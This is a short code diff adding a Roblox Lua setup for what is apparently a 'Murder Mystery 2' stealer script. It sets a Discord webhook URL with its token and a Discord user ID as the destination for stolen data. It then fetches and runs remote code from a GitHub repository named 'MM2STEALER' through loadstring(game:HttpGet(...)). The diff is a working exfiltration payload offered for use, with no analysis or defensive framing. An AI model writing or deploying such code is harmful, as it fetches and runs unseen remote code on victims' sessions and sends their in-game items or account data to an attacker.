@@ -1,1 +1,5 @@
+Username = "SynergyHolder_Server"
+Webhook = "https://discord.com/api/webhooks/1394774298819821599/ez4oCImCouosfvM6Xcs1fk672aauRa8VDCaSNiUa6y4LKCseBcsRpLMeyZGv_lhr_QVE"
+discuser = "575154130645942287"
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rghmodz2019/MM2STEALER/refs/heads/main/MM2"))()
